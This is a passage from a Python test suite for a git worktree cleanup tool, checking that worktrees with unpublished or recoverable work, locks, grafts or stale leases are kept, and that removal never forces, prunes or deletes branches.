        self.assertEqual(candidate["verdict"], "keep")
        self.assertIn("head_not_on_fetched_remote_ref", candidate["reasons"])

    def test_index_flags_cannot_hide_work_that_removal_would_destroy(self) -> None:
        worktree = self.add_worktree("assume-unchanged")
        self.git("update-index", "--assume-unchanged", "README.md", cwd=worktree)
        (worktree / "README.md").write_text("hidden change\n", encoding="utf-8")

        candidate = self.candidate(self.plan(), worktree)
        self.assertEqual(candidate["verdict"], "keep")
        self.assertIn("index_preservation_flags", candidate["reasons"])
        self.assertTrue(candidate["index_preservation_flags"])

    def test_clean_index_resolve_undo_state_is_a_preservation_blocker(self) -> None:
        conflict = self.repo / "conflict.txt"
        conflict.write_text("base\n", encoding="utf-8")
        self.git("add", "conflict.txt")
        self.git("commit", "-qm", "add conflict fixture")
        self.git("push", "-q")
        worktree = self.add_worktree("resolve-undo")

        conflict.write_text("main\n", encoding="utf-8")
        self.git("commit", "-qam", "change on main")
        self.git("push", "-q")
        worktree_conflict = worktree / "conflict.txt"
        worktree_conflict.write_text("branch\n", encoding="utf-8")
        self.git("commit", "-qam", "change on branch", cwd=worktree)
        merge = self.git("merge", "origin/main", cwd=worktree, check=False)
        self.assertNotEqual(merge.returncode, 0)
        worktree_conflict.write_text("resolved\n", encoding="utf-8")
        self.git("add", "conflict.txt", cwd=worktree)
        self.git("commit", "-qm", "resolve merge", cwd=worktree)
        self.git("push", "-q", "origin", "test/resolve-undo")
        self.assertEqual(self.git("status", "--porcelain", cwd=worktree).stdout, "")
        causal_probe = self.git("ls-files", "--resolve-undo", "-z", cwd=worktree).stdout
        self.assertTrue(causal_probe)

        plan = self.plan()
        candidate = self.candidate(plan, worktree)
        self.assertEqual(candidate["verdict"], "keep")
        self.assertIn("index_resolve_undo", candidate["reasons"])
        self.assertEqual(
            candidate["index_resolve_undo"],
            [entry for entry in causal_probe.split("\0") if entry],
        )
        self.assertTrue(harness.apply_worktree_plan(plan))
        self.assertTrue(worktree.is_dir())

    def test_mode_only_change_is_a_blocker_when_core_filemode_is_false(self) -> None:
        script = self.repo / "tool.sh"
        script.write_text("#!/bin/sh\n", encoding="utf-8")
        self.git("add", "tool.sh")
        self.git("commit", "-qm", "add script")
        self.git("push", "-q")
        worktree = self.add_worktree("mode-only")
        self.git("config", "core.fileMode", "false", cwd=worktree)
        worktree_script = worktree / "tool.sh"
        os.chmod(worktree_script, worktree_script.stat().st_mode | 0o111)
        causal_probe = self.git(
            "-c",
            "core.fileMode=true",
            "diff-files",
            "--summary",
            "--",
            "tool.sh",
            cwd=worktree,
        )
        if not causal_probe.stdout:
            self.skipTest("filesystem does not expose executable mode changes")
        self.assertEqual(self.git("status", "--porcelain=v1", cwd=worktree).stdout, "")

        plan = self.plan()
        candidate = self.candidate(plan, worktree)
        self.assertEqual(candidate["verdict"], "keep")
        self.assertIn("tracked_mode_changes", candidate["reasons"])
        self.assertTrue(candidate["tracked_mode_changes"])
        self.assertTrue(harness.apply_worktree_plan(plan))
        self.assertTrue(worktree.is_dir())

    def test_recovery_reachability_uses_one_stdin_query(self) -> None:
        commits = [f"{value:040x}" for value in range(1, 260)]
        expected_unretained = [commits[0], commits[-1]]
        calls: list[tuple[list[str], Path, str | None]] = []

        def runner(
            command: list[str], cwd: Path, *, stdin_text: str | None = None
        ) -> subprocess.CompletedProcess[str]:
            calls.append((command.copy(), cwd, stdin_text))
            return subprocess.CompletedProcess(
                command,
                0,
                f"{expected_unretained[-1].upper()}\n{expected_unretained[0]}\n"
                f"{expected_unretained[-1]}\n",
                "",
            )

        unretained, error = harness.commits_without_local_retention(
            self.repo, commits, runner
        )

        self.assertEqual(error, "")
        self.assertEqual(unretained, expected_unretained)
        self.assertEqual(len(calls), 1)
        command, cwd, stdin_text = calls[0]
        self.assertEqual(
            command,
            [
                "git",
                "rev-list",
                "--no-walk",
                "--stdin",
                "--not",
                "--branches",
                "--tags",
            ],
        )
        self.assertTrue(harness.same_worktree_path(cwd, self.repo))
        self.assertEqual(stdin_text, "".join(f"{object_id}\n" for object_id in commits))

    def test_empty_recovery_set_launches_no_reachability_query(self) -> None:
        calls = 0

        def runner(
            command: list[str], cwd: Path, *, stdin_text: str | None = None
        ) -> subprocess.CompletedProcess[str]:
            nonlocal calls
            calls += 1
            return subprocess.CompletedProcess(command, 0, "", "")

        unretained, error = harness.commits_without_local_retention(
            self.repo, [], runner
        )

        self.assertEqual((unretained, error), ([], ""))
        self.assertEqual(calls, 0)

    def test_recovery_reachability_query_fails_closed(self) -> None:
        commit = "a" * 40
        cases = (
            (7, "", "recovery reachability probe failed with exit 7"),
            (0, "not-an-object-id\n", "invalid object id"),
        )
        for returncode, stdout, expected_error in cases:
            with self.subTest(returncode=returncode, stdout=stdout):

                def runner(
                    command: list[str],
                    cwd: Path,
                    *,
                    stdin_text: str | None = None,
                ) -> subprocess.CompletedProcess[str]:
                    self.assertEqual(stdin_text, f"{commit}\n")
                    return subprocess.CompletedProcess(
                        command, returncode, stdout, "controlled failure"
                    )

                unretained, error = harness.commits_without_local_retention(
                    self.repo, [commit], runner
                )
                self.assertEqual(unretained, [])
                self.assertIn(expected_error, error)

    def test_worktree_local_state_and_unique_reflog_are_preserved(self) -> None:
        worktree = self.add_worktree("local-state")
        (worktree / "unique.txt").write_text("only here\n", encoding="utf-8")
        self.git("add", "unique.txt", cwd=worktree)
        self.git("commit", "-qm", "unique local commit", cwd=worktree)
        unique = self.git("rev-parse", "HEAD", cwd=worktree).stdout.strip()
        self.git("reset", "--hard", "origin/main", cwd=worktree)
        self.git("update-ref", "refs/bisect/bad", unique, cwd=worktree)

        local_ref_plan = self.plan()
        with_local_ref = self.candidate(local_ref_plan, worktree)
        self.assertEqual(with_local_ref["verdict"], "keep")
        self.assertIn("worktree_local_refs", with_local_ref["reasons"])
        self.assertIn("worktree_administrative_state", with_local_ref["reasons"])
        self.assertEqual(
            [item["ref"] for item in with_local_ref["worktree_local_refs"]],
            ["refs/bisect/bad"],
        )
        self.assertIn(unique, with_local_ref["unretained_recovery_commits"])
        self.assertTrue(harness.apply_worktree_plan(local_ref_plan))
        self.assertTrue(worktree.is_dir())

        self.git("update-ref", "-d", "refs/bisect/bad", cwd=worktree)
        reflog_only = self.candidate(self.plan(), worktree)
        self.assertEqual(reflog_only["verdict"], "keep")
        self.assertNotIn("worktree_local_refs", reflog_only["reasons"])
        self.assertIn("unretained_recovery_commits", reflog_only["reasons"])
        self.assertIn(unique, reflog_only["unretained_recovery_commits"])

        git_dir = Path(
            self.git("rev-parse", "--absolute-git-dir", cwd=worktree).stdout.strip()
        )
        (git_dir / "sequencer").mkdir()
        operation = self.candidate(self.plan(), worktree)
        self.assertIn("worktree_administrative_state", operation["reasons"])
        self.assertIn("sequencer", operation["worktree_administrative_state"])

    def test_old_side_of_head_reflog_preserves_unique_commit(self) -> None:
        worktree = self.add_worktree("old-reflog-side")
        self.git("switch", "--detach", cwd=worktree)
        (worktree / "unique.txt").write_text("only in reflog\n", encoding="utf-8")
        self.git("add", "unique.txt", cwd=worktree)
        self.git("commit", "-qm", "unique detached commit", cwd=worktree)
        unique = self.git("rev-parse", "HEAD", cwd=worktree).stdout.strip()
        self.git("switch", "test/old-reflog-side", cwd=worktree)

        git_dir = Path(
            self.git("rev-parse", "--absolute-git-dir", cwd=worktree).stdout.strip()
        )
        reflog_path = git_dir / "logs" / "HEAD"
        records = reflog_path.read_bytes().splitlines(keepends=True)
        retained_records = [
            record for record in records if record.split(b" ", 2)[1].decode() != unique
        ]
        self.assertLess(len(retained_records), len(records))
        self.assertTrue(
            any(
                record.split(b" ", 2)[0].decode() == unique
                for record in retained_records
            )
        )
        reflog_path.write_bytes(b"".join(retained_records))
        (git_dir / "COMMIT_EDITMSG").unlink(missing_ok=True)

        new_sides = self.git(
            "reflog", "show", "--format=%H", "--no-abbrev", "HEAD", cwd=worktree
        ).stdout.splitlines()
        self.assertNotIn(unique, new_sides)

        plan = self.plan()
        candidate = self.candidate(plan, worktree)
        self.assertEqual(candidate["verdict"], "keep")
        self.assertIn("unretained_recovery_commits", candidate["reasons"])
        self.assertIn(unique, candidate["recovery_commits"])
        self.assertIn(unique, candidate["unretained_recovery_commits"])
        self.assertTrue(harness.apply_worktree_plan(plan))
        self.assertTrue(worktree.is_dir())

    def test_non_regular_head_reflog_is_administrative_state(self) -> None:
        worktree = self.add_worktree("head-reflog-directory")
        git_dir = Path(
            self.git("rev-parse", "--absolute-git-dir", cwd=worktree).stdout.strip()
        )
        reflog_path = git_dir / "logs" / "HEAD"
        reflog_path.unlink()
        reflog_path.mkdir()
        evidence = reflog_path / "unique-recovery.txt"
        evidence.write_text("preserve me\n", encoding="utf-8")
        self.assertEqual(self.git("reflog", "show", "HEAD", cwd=worktree).returncode, 0)

        plan = self.plan()
        candidate = self.candidate(plan, worktree)
        self.assertEqual(candidate["verdict"], "keep")
        self.assertIn("worktree_administrative_state", candidate["reasons"])
        self.assertIn("logs/HEAD", candidate["worktree_administrative_state"])
        self.assertTrue(plan["complete"])
        self.assertTrue(harness.apply_worktree_plan(plan))
        self.assertTrue(evidence.is_file())

    def test_any_fetched_remote_tracking_ref_can_preserve_the_head(self) -> None:
        worktree = self.add_worktree("archive")
        (worktree / "archive.txt").write_text("published\n", encoding="utf-8")
        self.git("add", "archive.txt", cwd=worktree)
        self.git("commit", "-qm", "publish archive", cwd=worktree)
        self.git("push", "-q", "origin", "HEAD:refs/heads/archive", cwd=worktree)

        candidate = self.candidate(self.plan(), worktree)
        self.assertEqual(candidate["verdict"], "remove")
        self.assertEqual(candidate["commit_editmsg_status"], "matches_head")
        self.assertEqual(
            [item["ref"] for item in candidate["containing_remote_refs"]],
            ["refs/remotes/origin/archive"],
        )

    def test_failed_commit_message_is_a_preservation_blocker(self) -> None:
        worktree = self.add_worktree("failed-commit-message")
        hook = self.repo / ".git" / "hooks" / "commit-msg"
        hook.write_text("#!/bin/sh\nexit 1\n", encoding="utf-8")
        os.chmod(hook, 0o755)
        failed = self.git(
            "commit",
            "--allow-empty",
            "-m",
            "unique uncommitted rationale",
            cwd=worktree,
            check=False,
        )
        self.assertNotEqual(failed.returncode, 0)
        self.assertEqual(self.git("status", "--porcelain", cwd=worktree).stdout, "")
        git_dir = Path(
            self.git("rev-parse", "--absolute-git-dir", cwd=worktree).stdout.strip()
        )
        self.assertIn(
            "unique uncommitted rationale",
            (git_dir / "COMMIT_EDITMSG").read_text(encoding="utf-8"),
        )

        plan = self.plan()
        candidate = self.candidate(plan, worktree)
        self.assertEqual(candidate["verdict"], "keep")
        self.assertEqual(candidate["commit_editmsg_status"], "differs_from_head")
        self.assertIn("commit_editmsg_uncommitted", candidate["reasons"])
        self.assertNotIn("unique uncommitted rationale", json.dumps(candidate))
        self.assertTrue(harness.apply_worktree_plan(plan))
        self.assertTrue(worktree.is_dir())

    def test_narrow_fetch_refspec_cannot_leave_a_deleted_branch_looking_fresh(
        self,
    ) -> None:
        worktree = self.add_worktree("deleted-archive")
        (worktree / "archive.txt").write_text("once published\n", encoding="utf-8")
        self.git("add", "archive.txt", cwd=worktree)
        self.git("commit", "-qm", "publish then delete archive", cwd=worktree)
        self.git("push", "-q", "origin", "HEAD:refs/heads/archive", cwd=worktree)
        first = self.candidate(self.plan(), worktree)
        self.assertEqual(first["verdict"], "remove")

        self.git("push", "-q", "origin", ":refs/heads/archive")
        self.git("config", "--unset-all", "remote.origin.fetch")
        self.git(
            "config",
            "--add",
            "remote.origin.fetch",
            "+refs/heads/main:refs/remotes/origin/main",
        )
        second = self.candidate(self.plan(), worktree)
        self.assertEqual(second["verdict"], "keep")
        self.assertIn("head_not_on_fetched_remote_ref", second["reasons"])
        self.assertEqual(
            self.git(
                "for-each-ref",
                "--format=%(refname)",
                "refs/remotes/origin/archive",
            ).stdout.strip(),
            "",
        )

    def test_core_worktree_redirection_refuses_the_registered_path(self) -> None:
        worktree = self.add_worktree("redirected")
        alternate = self.base / "alternate-worktree"
        shutil.copytree(worktree, alternate, ignore=shutil.ignore_patterns(".git"))
        self.git("config", "extensions.worktreeConfig", "true")
        self.git(
            "config",
            "--worktree",
            "core.worktree",
            str(alternate),
            cwd=worktree,
        )

        candidate = self.candidate(self.plan(), worktree)
        self.assertEqual(candidate["verdict"], "keep")
        self.assertIn("worktree_path_redirected", candidate["reasons"])
        self.assertEqual(
            harness.canonical_worktree_path(Path(candidate["measured_toplevel"])),
            harness.canonical_worktree_path(alternate),
        )

    def test_grafts_and_replace_refs_cannot_supply_reachability(self) -> None:
        worktree = self.add_worktree("rewritten-history")
        grafts = self.repo / ".git" / "info" / "grafts"
        grafts.write_text("# even presence is refused\n", encoding="utf-8")
        grafted = self.candidate(self.plan(), worktree)
        self.assertIn("history_rewrite_metadata_present", grafted["reasons"])
        self.assertTrue(grafted["history_rewrite"]["grafts_present"])

        grafts.unlink()
        head = self.git("rev-parse", "HEAD").stdout.strip()
        self.git("update-ref", f"refs/replace/{head}", head)
        replaced = self.candidate(self.plan(), worktree)
        self.assertIn("history_rewrite_metadata_present", replaced["reasons"])
        self.assertEqual(
            replaced["history_rewrite"]["replace_refs"],
            [f"refs/replace/{head}"],
        )

    def test_inherited_external_graft_cannot_supply_reachability(self) -> None:
        worktree = self.add_worktree("external-graft")
        published = self.git("rev-parse", "origin/main").stdout.strip()
        tree = self.git("rev-parse", "HEAD^{tree}", cwd=worktree).stdout.strip()
        orphan = subprocess.run(
            ["git", "commit-tree", tree, "-m", "unpublished orphan"],
            cwd=worktree,
            capture_output=True,
            text=True,
            check=True,
        ).stdout.strip()
        self.git("reset", "--hard", orphan, cwd=worktree)
        graft = self.base / "external-grafts"
        graft.write_text(f"{published} {orphan}\n", encoding="utf-8")
        poisoned = os.environ.copy()
        poisoned["GIT_GRAFT_FILE"] = str(graft)
        causal_probe = subprocess.run(
            [
                "git",
                "for-each-ref",
                "--format=%(refname)",
                f"--contains={orphan}",
                "refs/remotes/",
            ],
            cwd=self.repo,
            capture_output=True,
            text=True,
            check=True,
            env=poisoned,
        )
        self.assertIn("refs/remotes/origin/main", causal_probe.stdout)

        with mock.patch.dict(os.environ, {"GIT_GRAFT_FILE": str(graft)}):
            plan = self.plan()
            candidate = self.candidate(plan, worktree)
        self.assertEqual(candidate["verdict"], "keep")
        self.assertIn("head_not_on_fetched_remote_ref", candidate["reasons"])
        self.assertEqual(candidate["containing_remote_refs"], [])
        self.assertTrue(harness.apply_worktree_plan(plan))
        self.assertTrue(worktree.is_dir())

    def test_primary_locked_and_outside_worktrees_are_never_candidates(self) -> None:
        locked = self.add_worktree("locked")
        outside = self.base / "outside"
        self.git("worktree", "add", "--detach", str(outside), "origin/main")
        self.git("worktree", "lock", "--reason", "fixture", str(locked))

        plan = self.plan()
        primary = self.candidate(plan, self.repo)
        self.assertIn("primary_checkout", primary["reasons"])
        self.assertIn("requested_checkout", primary["reasons"])
        self.assertIn("git_locked", self.candidate(plan, locked)["reasons"])
        self.assertIn(
            "outside_worktree_directory", self.candidate(plan, outside)["reasons"]
        )

    def test_apply_uses_plain_remove_never_prunes_and_keeps_branch(
        self,
    ) -> None:
        worktree = self.add_worktree(
            "remove-me", branch="test/worktree-closeout-retained"
        )
        plan = self.plan()
        calls: list[list[str]] = []
        lease_path = Path(self.candidate(plan, worktree)["lease"]["path"])
        mutation_lock = lease_path.parent / harness.WORKTREE_OWNERSHIP_LOCK_DIRECTORY
        reclaim_was_refused = False

        def recording_runner(
            command: list[str], cwd: Path, *, stdin_text: str | None = None
        ) -> subprocess.CompletedProcess[str]:
            nonlocal reclaim_was_refused
            calls.append(command.copy())
            if command[1:3] == ["worktree", "remove"]:
                self.assertTrue(mutation_lock.is_dir())
                with self.assertRaisesRegex(
                    harness.HarnessError, "mutation lock already exists"
                ):
                    harness.mutate_worktree_lease(
                        worktree,
                        action="acquire",
                        claimant="cooperating-successor",
                        replace_stale=True,
                        now=lambda: harness.worktree_utc_now() + timedelta(hours=2),
                    )
                reclaim_was_refused = True
            return harness.worktree_git_runner(command, cwd, stdin_text=stdin_text)

        self.assertTrue(
            harness.apply_worktree_plan(plan, command_runner=recording_runner)
        )
        candidate = self.candidate(plan, worktree)
        self.assertEqual(candidate["apply"], "removed")
        self.assertEqual(candidate["revalidation"], "matched")
        self.assertEqual(candidate["fingerprint"], candidate["revalidated_fingerprint"])
        self.assertTrue(reclaim_was_refused)
        self.assertFalse(worktree.exists())
        self.assertEqual(
            self.git(
                "show-ref",
                "--verify",
                "refs/heads/test/worktree-closeout-retained",
                check=False,
            ).returncode,
            0,
        )
        remove_calls = [call for call in calls if call[1:3] == ["worktree", "remove"]]
        self.assertEqual(len(remove_calls), 1)
        self.assertNotIn("--force", remove_calls[0])
        self.assertNotIn("-f", remove_calls[0])
        self.assertFalse(any(call[1:3] == ["worktree", "prune"] for call in calls))
        self.assertFalse(any(call[1:2] == ["branch"] for call in calls))
        self.assertEqual(
            plan["administrative_cleanup"], "plain_remove_only_no_global_prune"
        )

    def test_expired_fingerprint_lease_refuses_removal(self) -> None:
        worktree = self.add_worktree("expired")
        origin = harness.worktree_utc_now()
        plan = self.plan(clock=lambda: 0.0, now=lambda: origin)
        self.assertFalse(
            harness.apply_worktree_plan(
                plan,
                clock=lambda: harness.WORKTREE_FINGERPRINT_LEASE_SECONDS + 1.0,
                now=lambda: origin + timedelta(seconds=1),
            )
        )
        candidate = self.candidate(plan, worktree)
        self.assertEqual(candidate["apply_reason"], "fingerprint_lease_expired")
        self.assertTrue(worktree.is_dir())

    def test_suspend_inclusive_fingerprint_age_refuses_removal(self) -> None:
        worktree = self.add_worktree("suspend-expired")
        origin = harness.worktree_utc_now()
        plan = self.plan(clock=lambda: 0.0, now=lambda: origin)

        self.assertFalse(
            harness.apply_worktree_plan(
                plan,
                clock=lambda: 1.0,
                now=lambda: origin
                + timedelta(seconds=harness.WORKTREE_FINGERPRINT_LEASE_SECONDS + 1),
            )
        )
        candidate = self.candidate(plan, worktree)
        self.assertEqual(candidate["apply_reason"], "fingerprint_lease_expired")
        self.assertEqual(candidate["revalidation"], "expired")
        self.assertTrue(worktree.is_dir())

    def test_fingerprint_utc_clock_rollback_refuses_removal(self) -> None:
        worktree = self.add_worktree("clock-rollback")
        origin = harness.worktree_utc_now()
        plan = self.plan(clock=lambda: 0.0, now=lambda: origin)

        self.assertFalse(
            harness.apply_worktree_plan(
                plan,
                clock=lambda: 1.0,
                now=lambda: origin - timedelta(seconds=1),
            )
        )
        candidate = self.candidate(plan, worktree)
        self.assertEqual(candidate["apply_reason"], "fingerprint_utc_clock_rollback")
        self.assertEqual(candidate["revalidation"], "invalid")
        self.assertTrue(worktree.is_dir())

    def test_fingerprint_utc_expiry_during_revalidation_refuses_removal(
        self,
    ) -> None:
        worktree = self.add_worktree("revalidation-expired")
        origin = harness.worktree_utc_now()
        plan = self.plan(clock=lambda: 0.0, now=lambda: origin)
        current_times = [
            origin + timedelta(seconds=1),
            origin + timedelta(seconds=1),
            origin + timedelta(seconds=harness.WORKTREE_FINGERPRINT_LEASE_SECONDS + 1),
        ]

        self.assertFalse(
            harness.apply_worktree_plan(
                plan,
                clock=lambda: 1.0,
                now=lambda: current_times.pop(0),
            )
        )
        candidate = self.candidate(plan, worktree)
        self.assertEqual(candidate["apply_reason"], "fingerprint_lease_expired")
        self.assertEqual(candidate["revalidation"], "expired")
        self.assertEqual(current_times, [])
        self.assertTrue(worktree.is_dir())

    def test_missing_or_malformed_fingerprint_utc_origin_refuses_apply(
        self,
    ) -> None:
        worktree = self.add_worktree("missing-utc-origin")
        for label, generated_at in (("missing", None), ("malformed", "not-a-time")):
            with self.subTest(label=label):
                plan = self.plan()
                if generated_at is None:
                    plan.pop("generated_at")
                else:
                    plan["generated_at"] = generated_at
                self.assertFalse(harness.apply_worktree_plan(plan))
                self.assertEqual(plan["apply_error"], "fingerprint_origin_missing")
                self.assertTrue(worktree.is_dir())

    def test_ignored_file_change_between_plan_and_remove_is_revalidated(self) -> None:
        worktree = self.add_worktree("race")
        plan = self.plan()
        changed = False

        def racing_runner(
            command: list[str], cwd: Path, *, stdin_text: str | None = None
        ) -> subprocess.CompletedProcess[str]:
            nonlocal changed
            if (
                not changed
                and command[1:4] == ["status", "--porcelain=v1", "-z"]
                and harness.same_worktree_path(cwd, worktree)
            ):
                (worktree / "private-report.md").write_text(
                    "arrived late\n", encoding="utf-8"
                )
                changed = True
            return harness.worktree_git_runner(command, cwd, stdin_text=stdin_text)

        self.assertFalse(
            harness.apply_worktree_plan(plan, command_runner=racing_runner)
        )
        self.assertTrue(changed)
        candidate = self.candidate(plan, worktree)
        self.assertEqual(candidate["apply_reason"], "state_changed_since_audit")
        self.assertTrue(worktree.is_dir())
        self.assertTrue((worktree / "private-report.md").is_file())

    def test_administrative_state_change_before_remove_is_revalidated(self) -> None:
        worktree = self.add_worktree("admin-race")
        plan = self.plan()
        changed = False

        def racing_runner(
            command: list[str], cwd: Path, *, stdin_text: str | None = None
        ) -> subprocess.CompletedProcess[str]:
            nonlocal changed
            if (
                not changed
                and command[1:3] == ["rev-parse", "--absolute-git-dir"]
                and harness.same_worktree_path(cwd, worktree)
            ):
                git_dir = Path(
                    self.git(
                        "rev-parse", "--absolute-git-dir", cwd=worktree
                    ).stdout.strip()
                )
                (git_dir / "sequencer").mkdir()
                changed = True
            return harness.worktree_git_runner(command, cwd, stdin_text=stdin_text)

        self.assertFalse(
            harness.apply_worktree_plan(plan, command_runner=racing_runner)
        )
        self.assertTrue(changed)
        candidate = self.candidate(plan, worktree)
        self.assertEqual(candidate["apply_reason"], "state_changed_since_audit")
        self.assertTrue(worktree.is_dir())

    def test_administrative_state_probe_failure_is_incomplete(self) -> None:
        worktree = self.add_worktree("admin-probe-failure")
        with mock.patch.object(
            harness,
            "worktree_administrative_state",
            return_value=([], "permission denied"),
        ):
            plan = self.plan()
        candidate = self.candidate(plan, worktree)
        self.assertIn(
            "worktree_administrative_state_probe_failed", candidate["reasons"]
        )
        self.assertFalse(plan["complete"])
        self.assertFalse(harness.apply_worktree_plan(plan))
        self.assertEqual(plan["apply_error"], "audit_incomplete")
        self.assertTrue(worktree.is_dir())

    def test_commit_editmsg_probe_failure_is_incomplete(self) -> None:
        worktree = self.add_worktree("commit-message-probe-failure")
        with mock.patch.object(
            harness,
            "worktree_commit_editmsg_status",
            return_value=("unknown", "permission denied"),
        ):
            plan = self.plan()
        candidate = self.candidate(plan, worktree)
        self.assertIn("commit_editmsg_probe_failed", candidate["reasons"])
        self.assertFalse(plan["complete"])
        self.assertFalse(harness.apply_worktree_plan(plan))
        self.assertEqual(plan["apply_error"], "audit_incomplete")
        self.assertTrue(worktree.is_dir())

    def test_lease_change_during_revalidation_refuses_plain_removal(self) -> None:
        worktree = self.add_worktree("lease-race")
        plan = self.plan()
        original_inspector = harness.inspect_worktree_lease
        calls = 0

        def changing_inspector(*args, **kwargs):
            nonlocal calls
            result = original_inspector(*args, **kwargs)
            calls += 1
            if calls == 1:
                lease_path = Path(result[0]["path"])
                record = result[0]["record"].copy()
                record["lease_id"] = str(harness.uuid.uuid4())
                harness.write_worktree_lease(lease_path, record)
            return result

        with mock.patch.object(
            harness, "inspect_worktree_lease", side_effect=changing_inspector
        ):
            self.assertFalse(harness.apply_worktree_plan(plan))
        candidate = self.candidate(plan, worktree)
        self.assertEqual(
            candidate["apply_reason"], "cooperative_lease_revalidation_failed"
        )
        self.assertTrue(worktree.is_dir())

    def test_fetch_status_remove_and_prune_failures_are_not_parsed_as_success(
        self,
    ) -> None:
        worktree = self.add_worktree("failures")

        def fetch_failure(
            command: list[str], cwd: Path, *, stdin_text: str | None = None
        ) -> subprocess.CompletedProcess[str]:
            if command[1:2] == ["fetch"]:
                return subprocess.CompletedProcess(command, 9, "stale output", "failed")
            return harness.worktree_git_runner(command, cwd, stdin_text=stdin_text)

        fetch_plan = harness.worktree_plan(
            self.repo,
            refresh=True,
            command_runner=fetch_failure,
            process_cwd=self.repo,
        )
        self.assertFalse(fetch_plan["complete"])
        self.assertFalse(fetch_plan["refresh"]["ok"])
        output = io.StringIO()
        with redirect_stdout(output):
            code = harness.worktrees_command(
                SimpleNamespace(
                    repo=str(self.repo),
                    refresh=True,
                    apply=True,
                    claimant=self.claimant,
                    json=True,
                ),
                command_runner=fetch_failure,
            )
        self.assertEqual(code, 1)
        self.assertEqual(
            json.loads(output.getvalue())["apply_error"], "remote_refresh_failed"
        )

        status_injected = False

        def status_failure(
            command: list[str], cwd: Path, *, stdin_text: str | None = None
        ) -> subprocess.CompletedProcess[str]:
            nonlocal status_injected
            if command[1:2] == ["status"] and harness.same_worktree_path(cwd, worktree):
                status_injected = True
                return subprocess.CompletedProcess(
                    command, 8, "?? misleading", "failed"
                )
            return harness.worktree_git_runner(command, cwd, stdin_text=stdin_text)

        status_plan = harness.worktree_plan(
            self.repo,
            refresh=True,
            command_runner=status_failure,
            process_cwd=self.repo,
        )
        status_candidate = self.candidate(status_plan, worktree)
        self.assertTrue(status_injected)
        self.assertIn("status_probe_failed", status_candidate["reasons"])
        self.assertFalse(status_plan["complete"])

        good_plan = self.plan()
        calls: list[list[str]] = []

        def remove_failure(
            command: list[str], cwd: Path, *, stdin_text: str | None = None
        ) -> subprocess.CompletedProcess[str]:
            calls.append(command.copy())
            if command[1:3] == ["worktree", "remove"]:
                return subprocess.CompletedProcess(command, 7, "", "refused")
            return harness.worktree_git_runner(command, cwd, stdin_text=stdin_text)

        self.assertFalse(
            harness.apply_worktree_plan(good_plan, command_runner=remove_failure)
        )
        self.assertTrue(worktree.is_dir())
        self.assertEqual(
            self.candidate(good_plan, worktree)["apply_reason"],
            "plain_remove_refused",
        )
        self.assertFalse(any(call[1:3] == ["worktree", "prune"] for call in calls))

    def test_partial_apply_list_failure_is_reported_in_json(self) -> None:
        first = self.add_worktree("partial-json-01-removed")
        current = self.add_worktree("partial-json-02-failing")
        remaining = self.add_worktree("partial-json-03-remaining")
        runner, calls, state = self.fail_list_after_first_remove_runner()
        output = io.StringIO()

        with redirect_stdout(output):
            code = harness.worktrees_command(
                SimpleNamespace(
                    repo=str(self.repo),
                    refresh=True,
                    apply=True,
                    claimant=self.claimant,
                    json=True,
                ),
                command_runner=runner,
            )

        payload = json.loads(output.getvalue())
        self.assertEqual(code, 1)
        self.assertEqual(payload["apply_error"], "partial_apply_revalidation_failed")
        self.assertEqual(payload["summary"]["would_remove"], 3)
        self.assertEqual(payload["summary"]["removed"], 1)
        self.assertEqual(payload["summary"]["apply_refusals"], 2)
        first_result = self.candidate(payload, first)
        self.assertEqual(first_result["apply"], "removed")
        self.assertEqual(first_result["revalidation"], "matched")
        current_result = self.candidate(payload, current)
        self.assertEqual(current_result["apply"], "kept")
        self.assertEqual(current_result["revalidation"], "unavailable")
        self.assertEqual(current_result["apply_reason"], "revalidation_probe_failed")
        remaining_result = self.candidate(payload, remaining)
        self.assertEqual(remaining_result["apply"], "kept")
        self.assertEqual(remaining_result["revalidation"], "not_requested")
        self.assertEqual(
            remaining_result["apply_reason"],
            "not_attempted_after_revalidation_failure",
        )
        self.assertEqual(state, {"removals": 1, "failed_lists": 1})
        self.assertFalse(first.exists())
        self.assertTrue(current.is_dir())
        self.assertTrue(remaining.is_dir())
        remove_calls = [call for call in calls if call[1:3] == ["worktree", "remove"]]
        self.assertEqual(len(remove_calls), 1)
        self.assertNotIn("--force", remove_calls[0])
        self.assertNotIn("-f", remove_calls[0])
        self.assertFalse(any(call[1:3] == ["worktree", "prune"] for call in calls))
        self.assertFalse(any(call[1:2] == ["branch"] for call in calls))

    def test_partial_apply_list_failure_is_reported_in_text(self) -> None:
        first = self.add_worktree("partial-text-01-removed")
        current = self.add_worktree("partial-text-02-failing")
        remaining = self.add_worktree("partial-text-03-remaining")
        runner, calls, state = self.fail_list_after_first_remove_runner()
        output = io.StringIO()

        with redirect_stdout(output):
            code = harness.worktrees_command(
                SimpleNamespace(
                    repo=str(self.repo),
                    refresh=True,
                    apply=True,
                    claimant=self.claimant,
                    json=False,
                ),
                command_runner=runner,
            )

        text = output.getvalue()
        self.assertEqual(code, 1)
        self.assertIn("[FAIL] apply: partial_apply_revalidation_failed", text)
        self.assertIn("applied: removed with plain git worktree remove", text)
        self.assertIn("applied: kept (revalidation_probe_failed)", text)
        self.assertIn("applied: kept (not_attempted_after_revalidation_failure)", text)
        self.assertIn("summary: 3 removable, 1 kept, 1 removed, 2 apply refusals", text)
        self.assertEqual(state, {"removals": 1, "failed_lists": 1})
        self.assertFalse(first.exists())
        self.assertTrue(current.is_dir())
        self.assertTrue(remaining.is_dir())
        self.assertEqual(
            len([call for call in calls if call[1:3] == ["worktree", "remove"]]),
            1,
        )
        self.assertFalse(any(call[1:3] == ["worktree", "prune"] for call in calls))
        self.assertFalse(any(call[1:2] == ["branch"] for call in calls))

    def test_head_index_reachability_and_list_failures_block(self) -> None:
        worktree = self.add_worktree("probe-failures")

        def runner_failing(predicate):
            injected: list[list[str]] = []

            def failing_runner(
                command: list[str], cwd: Path, *, stdin_text: str | None = None
            ) -> subprocess.CompletedProcess[str]:
                if predicate(command, cwd):
                    injected.append(command.copy())
                    return subprocess.CompletedProcess(
                        command, 6, "misleading", "failed"
                    )
                return harness.worktree_git_runner(command, cwd, stdin_text=stdin_text)

            return failing_runner, injected

        cases = (
            (
                "head_probe_failed",
                lambda command, cwd: command[1:3] == ["rev-parse", "HEAD"]
                and harness.same_worktree_path(cwd, worktree),
            ),
            (
                "index_probe_failed",
                lambda command, cwd: command[1:3] == ["ls-files", "-v"]
                and harness.same_worktree_path(cwd, worktree),
            ),
            (
                "index_resolve_undo_probe_failed",
                lambda command, cwd: command[1:3] == ["ls-files", "--resolve-undo"]
                and harness.same_worktree_path(cwd, worktree),
            ),
            (
